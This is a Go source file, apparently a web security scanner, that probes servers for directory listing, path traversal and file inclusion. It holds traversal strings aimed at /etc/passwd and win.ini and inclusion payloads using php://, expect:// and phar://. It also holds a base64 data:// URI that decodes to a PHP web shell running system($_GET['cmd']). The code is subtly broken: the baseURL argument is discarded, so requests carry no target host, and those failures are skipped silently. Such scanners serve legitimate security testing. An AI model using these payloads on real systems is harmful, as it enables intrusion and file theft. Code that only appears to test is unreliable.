package static

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/sirupsen/logrus"
)

// Tester handles static resource security testing
type Tester struct {
	logger *logrus.Logger
	client *http.Client
}

// New creates a new static resource tester instance
func New(logger *logrus.Logger, client *http.Client, baseURL string) *Tester {
	// Set reasonable timeouts to prevent hanging
	client.Timeout = 10 * time.Second

	return &Tester{
		logger: logger,
		client: client,
	}
}

// RunTests performs static resource security tests
func (t *Tester) RunTests(paths []string) error {
	t.logger.Info("Starting static resource security tests")

	var wg sync.WaitGroup
	results := make(chan error, 3)

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Test resource enumeration
	wg.Add(1)
	go func() {
		defer wg.Done()
		if err := t.testResourceEnumeration(); err != nil {
			select {
			case results <- fmt.Errorf("Resource Enumeration test failed: %w", err):
			case <-ctx.Done():
				return
			}
		}
	}()

	// Test directory traversal
	wg.Add(1)
	go func() {
		defer wg.Done()
		if err := t.testDirectoryTraversal(); err != nil {
			select {
			case results <- fmt.Errorf("Directory Traversal test failed: %w", err):
			case <-ctx.Done():
				return
			}
		}
	}()

	// Test file inclusion
	wg.Add(1)
	go func() {
		defer wg.Done()
		if err := t.testFileInclusion(); err != nil {
			select {
			case results <- fmt.Errorf("File Inclusion test failed: %w", err):
			case <-ctx.Done():
				return
			}
		}
	}()

	// Wait for all tests to complete or timeout
	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		close(results)
	case <-ctx.Done():
		t.logger.Warn("Tests timed out")
		return ctx.Err()
	}

	// Collect any errors
	for err := range results {
		if err != nil && !strings.Contains(err.Error(), "no such host") {
			t.logger.Warn(err)
		}
	}

	return nil
}

func (t *Tester) testResourceEnumeration() error {
	paths := []string{
		"/api/v1/files/",
		"/api/v1/files/uploads/",
		"/api/v1/files/downloads/",
		"/api/v1/files/temp/",
		"/api/v1/files/public/",
		"/api/v1/files/private/",
		"/api/v1/files/user/",
		"/api/v1/files/admin/",
	}

	patterns := []string{
		"*",
		"*.*",
		"*.jpg",
		"*.png",
		"*.pdf",
		"*.doc",
		"*.xls",
		"*.zip",
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	for _, path := range paths {
		for _, pattern := range patterns {
			select {
			case <-ctx.Done():
				return ctx.Err()
			default:
				// URL encode the pattern
				encodedPattern := url.QueryEscape(pattern)
				testURL := fmt.Sprintf("%s%s", path, encodedPattern)

				req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
				if err != nil {
					continue
				}

				resp, err := t.client.Do(req)
				if err != nil {
					// Skip DNS resolution errors
					if strings.Contains(err.Error(), "no such host") {
						continue
					}
					return err
				}

				if resp != nil && resp.Body != nil {
					body := make([]byte, 1024)
					n, _ := resp.Body.Read(body)
					resp.Body.Close()

					if resp.StatusCode == http.StatusOK {
						content := string(body[:n])
						if strings.Contains(content, "Index of") ||
							strings.Contains(content, "Directory listing") ||
							strings.Contains(content, "<a href=\"../\"") {
							t.logger.Warnf("Directory listing enabled at: %s", testURL)
						}
					}
				}
			}
		}
	}

	return nil
}

func (t *Tester) testDirectoryTraversal() error {
	paths := []string{
		"../../../etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"....//....//....//etc/passwd",
		"%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
		"..\\..\\..\\windows\\win.ini",
		"..%5C..%5C..%5Cwindows%5Cwin.ini",
		"....\\\\....\\\\....\\\\windows\\win.ini",
		"%2E%2E%5C%2E%2E%5C%2E%2E%5Cwindows%5Cwin.ini",
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	for _, path := range paths {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			req, err := http.NewRequestWithContext(ctx, "GET", path, nil)
			if err != nil {
				continue
			}

			resp, err := t.client.Do(req)
			if err != nil {
				// Skip DNS resolution errors
				if strings.Contains(err.Error(), "no such host") {
					continue
				}
				return err
			}

			if resp != nil && resp.Body != nil {
				body := make([]byte, 1024)
				n, _ := resp.Body.Read(body)
				resp.Body.Close()

				if resp.StatusCode == http.StatusOK {
					content := string(body[:n])
					if strings.Contains(content, "root:") ||
						strings.Contains(content, "[fonts]") {
						t.logger.Warnf("Directory traversal possible with path: %s", path)
					}
				}
			}
		}
	}

	return nil
}

func (t *Tester) testFileInclusion() error {
	paths := []string{
		"file:///etc/passwd",
		"http://localhost/etc/passwd",
		"https://localhost/etc/passwd",
		"php://filter/convert.base64-encode/resource=index.php",
		"php://input",
		"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
		"expect://id",
		"phar://test.phar",
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	for _, path := range paths {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			req, err := http.NewRequestWithContext(ctx, "GET", path, nil)
			if err != nil {
				continue
			}

			resp, err := t.client.Do(req)
			if err != nil {
				// Skip DNS resolution errors
				if strings.Contains(err.Error(), "no such host") {
					continue
				}
				return err
			}

			if resp != nil && resp.Body != nil {
				body := make([]byte, 1024)
				n, _ := resp.Body.Read(body)
				resp.Body.Close()

				if resp.StatusCode == http.StatusOK {
					content := string(body[:n])
					if strings.Contains(content, "root:") ||
						strings.Contains(content, "<?php") ||
						strings.Contains(content, "uid=") {
						t.logger.Warnf("File inclusion possible with path: %s", path)
					}
				}
			}
		}
	}

	return nil
}
